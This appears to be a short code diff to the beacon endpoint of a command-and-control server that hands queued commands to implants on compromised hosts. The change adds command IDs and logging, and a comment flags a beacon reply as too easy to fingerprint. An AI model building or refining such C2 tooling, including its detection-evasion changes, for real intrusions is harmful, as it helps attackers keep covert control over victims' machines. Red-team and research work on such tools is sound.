@@ -117,9 +117,10 @@ def implant_beacon_endpoint():
     if 'X-Implant' not in request.headers:
         return "=="
     if request.method == "POST":
-        next_cmd = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
-        if next_cmd != "==":
+        next_cmd, command_id = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
+        if next_cmd != None:
             processed_return_val = preprocessing[next_cmd['type']](next_cmd)
+            print("Sending command to implant!\nCommand string: {}\ncommand_id: {}".format(processed_return_val, command_id))
             return processed_return_val
     # Need to remove the use of == in beacons: this is too fingerprintable.
     return "=="
